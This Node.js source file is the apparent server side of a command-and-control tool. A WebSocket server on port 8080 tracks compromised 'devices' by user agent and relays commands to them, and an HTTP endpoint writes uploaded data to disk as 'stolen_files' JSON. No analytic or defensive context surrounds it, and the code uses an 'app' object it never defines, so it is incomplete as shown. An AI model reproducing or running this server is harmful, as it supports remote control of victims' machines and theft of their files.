const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });
const devices = [];

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        if (data.device) {
            devices.push({ id: Math.random().toString(36).slice(2), userAgent: data.device });
            wss.clients.forEach(client => client.send(JSON.stringify({ devices})));} else if (data.id && data.cmd) {
            wss.clients.forEach(client => client.send(JSON.stringify(data)));}    });
});

app.post('/files', (req, res) => {
    require('fs').writeFileSync(`stolen_files_${Date.now()}.json`, JSON.stringify(req.body));
    res.sendStatus(200);
});

app.post('/ping', (req, res) => {
    devices.push({ id: Math.random().toString(36).slice(2), userAgent: req.body.device });
    wss.clients.forEach(client => client.send(JSON.stringify({ devices})));
    res.sendStatus(200);
});
